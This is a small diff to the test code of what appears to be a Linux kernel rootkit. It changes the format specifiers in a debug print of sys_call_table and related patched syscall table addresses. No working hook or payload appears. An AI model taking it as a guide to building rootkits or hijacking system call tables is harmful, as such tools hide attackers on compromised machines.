@@ -144,7 +144,7 @@ void pid_list_test(void) {
 
 void kernel_test(void) {
 	pinfo("Hello from relocated rootkit kernel!\n");
-	pinfo("sys_call_table = %p, ia32_sys_call_table = %p, my_sct = %p, my_ia32sct = %p, psct_slowpath = %p, psct_fastpath = %p, pia32sct = %p\n",
+	pinfo("sys_call_table = %Lx, ia32_sys_call_table = %Lx, my_sct = %Lx, my_ia32sct = %Lx, psct_slowpath = %Lx, psct_fastpath = %Lx, pia32sct = %Lx\n",
 	sys_call_table, ia32_sys_call_table, my_sct, my_ia32sct, psct_slowpath, psct_fastpath, pia32sct
 	);
 
